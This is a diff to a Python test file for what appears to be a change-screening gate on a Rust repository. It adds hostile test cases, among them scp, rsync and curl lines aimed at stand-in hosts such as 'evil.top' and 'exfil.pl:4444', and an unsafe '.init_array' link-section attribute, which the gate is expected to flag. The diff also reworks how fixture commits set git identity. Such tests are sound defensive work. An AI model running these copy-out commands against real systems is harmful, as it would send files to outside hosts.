@@ -122,6 +122,13 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("curl-file-tld", "network-literal", added(base, "curl evil.sh"), "network-literal")
     add("ssh-port-flag", "network-literal", added(base, "ssh -p 22 evil.top"), "network-literal")
     add("port-unlisted-tld", "network-literal", added(base, "peer = exfil.tv:443"), "network-literal")
+    add("scp-relative-destination", "network-literal", added(base, "scp evil.top:loot /tmp"), "network-literal")
+    add("rsync-relative-destination", "network-literal", added(base, "rsync -a out evil.top:loot"), "network-literal")
+    add("rsync-daemon", "network-literal", added(base, "rsync evil.top::mod /dest"), "network-literal")
+    add("protocol-relative", "network-literal", added(base, 'const u = "//evil.top:443/v1";'), "network-literal")
+    add("perl-tld-port", "network-literal", added(base, "peer = exfil.pl:4444"), "network-literal")
+    add("zip-tld-port", "network-literal", added(base, "peer = evil.zip:4444"), "network-literal")
+    add("curl-header-flag", "network-literal", added(base, 'curl -H "X: y" evil.top'), "network-literal")
     add("scp-destination", "network-literal", added(base, "scp ./out evil.top:/x"), "network-literal")
     add("rsync-destination", "network-literal", added(base, "rsync -a ./out evil.top:/x"), "network-literal")
     add("file-tld-wellknown-port", "network-literal", added(base, 'const C2: &str = "c2.rs:443";'), "network-literal")
@@ -132,6 +139,7 @@ def hostile_cases() -> list[tuple[str, str, bridge.Case, str]]:
     add("unsafe-fn", "unsafe", added(base, "pub unsafe fn read(ptr: *const u8) -> u8 {"), "unsafe")
     add("unsafe-brace-next-line", "unsafe", added(base, "    unsafe"), "unsafe")
     add("unsafe-attribute", "unsafe", added(base, '#[unsafe(link_section = ".init_array")]'), "unsafe")
+    add("unsafe-wrapped-attr", "unsafe", added(base, '    unsafe(link_section = ".init_array")'), "unsafe")
     add("unsafe-cfg-attr", "unsafe", added(base, '#[cfg_attr(feature = "x", unsafe(no_mangle))]'), "unsafe")
     add("proc-macro", "build", added(base, "proc-macro = true", "crates/probe/Cargo.toml"), "build")
     add("dependency-section", "build", added(base, "[dependencies]", "Cargo.toml"), "build")
@@ -161,11 +169,8 @@ def check_caps() -> None:
     for case in at_cap:
         assert bridge.evaluate(case) == bridge.ALLOW
 
-FIXTURE_ENV = dict(os.environ, GIT_AUTHOR_NAME="Fixture", GIT_AUTHOR_EMAIL="fixture@example.invalid", GIT_COMMITTER_NAME="Fixture", GIT_COMMITTER_EMAIL="fixture@example.invalid")
-
-
 def git_in(repo: pathlib.Path, *args: str) -> bytes:
-    return bridge.git(["-C", str(repo), *args], env=FIXTURE_ENV).stdout
+    return bridge.git(["-C", str(repo), *args]).stdout
 
 
 def stage(repo: pathlib.Path, files: dict[str, bytes]) -> None:
@@ -179,7 +184,7 @@ def fixture_repo(repo: pathlib.Path, files: dict[str, bytes]) -> pathlib.Path:
     repo.mkdir(parents=True, exist_ok=True)
     git_in(repo, "init", "-q", "-b", "main")
     stage(repo, files)
-    git_in(repo, "-c", "core.hooksPath=/dev/null", "commit", "--allow-empty", "-qm", "Base")
+    git_in(repo, "-c", "core.hooksPath=/dev/null", "-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid", "commit", "--allow-empty", "-qm", "Base")
     return repo
 
 
